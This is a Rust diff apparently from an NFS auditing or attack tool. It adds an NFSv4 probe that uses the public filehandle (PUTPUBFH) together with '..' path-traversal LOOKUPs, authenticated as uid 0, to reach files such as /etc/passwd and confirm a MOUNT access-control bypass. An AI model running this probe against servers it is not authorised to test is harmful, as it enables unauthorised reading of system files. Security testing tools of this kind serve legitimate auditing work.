@@ -239,6 +239,65 @@ async fn try_webnfs_escape(host: &str, globals: &GlobalOpts) -> Option<EscapeOut
         return Some(EscapeOutcome::WebNfs { public_handle: FileHandle::from_bytes(&public_v2.0), version: "v2" });
     }
 
+    // NFSv4: PUTPUBFH sets the current FH to the server's public handle (op 23,
+    // RFC 7530 S16.21). Follow with a multi-component LOOKUP of a traversal path
+    // and GETFH. If the server processes the traversal, the public handle with
+    // path traversal works -- MOUNT bypass confirmed.
+    if let Some(outcome) = try_webnfs_v4(addr, traversal, globals.proxy.as_deref()).await {
+        return Some(outcome);
+    }
+
+    None
+}
+
+/// NFSv4 public filehandle probe: PUTPUBFH -> LOOKUP(traversal) -> GETFH.
+///
+/// RFC 7530 S16.21 defines PUTPUBFH (op 23) as the v4 analogue of the WebNFS
+/// public handle. If the server accepts the compound and returns a file handle,
+/// the public FH with path traversal is confirmed -- no MOUNT needed.
+async fn try_webnfs_v4(addr: std::net::SocketAddr, traversal: &str, proxy: Option<&str>) -> Option<EscapeOutcome> {
+    use crate::proto::nfs4::compound::Nfs4DirectClient;
+    use crate::proto::nfs4::types::{ArgOp, ResOpData};
+
+    // Connect with AUTH_SYS uid=0 (most servers require at least AUTH_SYS).
+    let mut client = match Nfs4DirectClient::connect_with_auth_proxy(addr, 0, 0, "localhost", proxy).await {
+        Ok(c) => c,
+        Err(_) => match Nfs4DirectClient::connect_proxy(addr, proxy).await {
+            Ok(c) => c,
+            Err(_) => return None,
+        },
+    };
+
+    // NFSv4 LOOKUP processes one component at a time (no slashes), but
+    // PUTPUBFH per RFC 7530 S16.21.5 allows the server to apply multi-component
+    // lookup rules when the name contains slashes, similar to WebNFS for v2/v3.
+    // Try the traversal as a single LOOKUP name first (slash-aware servers split it),
+    // then fall back to component-by-component LOOKUPs for the same path.
+    let ops = vec![ArgOp::Putpubfh, ArgOp::Lookup(traversal.to_owned()), ArgOp::Getfh];
+    if let Ok(res) = client.compound(ops).await
+        && res.status == 0
+        && let Some(fh_data) = res.results.iter().find_map(|op| if let ResOpData::Fh(fh) = &op.data { Some(fh.clone()) } else { None })
+    {
+        tracing::info!("WebNFS public handle accepted on NFSv4 (single LOOKUP) -- MOUNT bypass confirmed");
+        return Some(EscapeOutcome::WebNfs { public_handle: FileHandle::from_bytes(&fh_data), version: "v4" });
+    }
+
+    // Component-by-component: PUTPUBFH -> LOOKUP("..") -> LOOKUP("..") -> ... -> LOOKUP("etc") -> LOOKUP("passwd") -> GETFH
+    let components: Vec<&str> = traversal.split('/').filter(|c| !c.is_empty()).collect();
+    let mut ops = Vec::with_capacity(components.len() + 2);
+    ops.push(ArgOp::Putpubfh);
+    for comp in &components {
+        ops.push(ArgOp::Lookup((*comp).to_owned()));
+    }
+    ops.push(ArgOp::Getfh);
+    if let Ok(res) = client.compound(ops).await
+        && res.status == 0
+        && let Some(fh_data) = res.results.iter().find_map(|op| if let ResOpData::Fh(fh) = &op.data { Some(fh.clone()) } else { None })
+    {
+        tracing::info!("WebNFS public handle accepted on NFSv4 (component LOOKUP) -- MOUNT bypass confirmed");
+        return Some(EscapeOutcome::WebNfs { public_handle: FileHandle::from_bytes(&fh_data), version: "v4" });
+    }
+
     None
 }
 
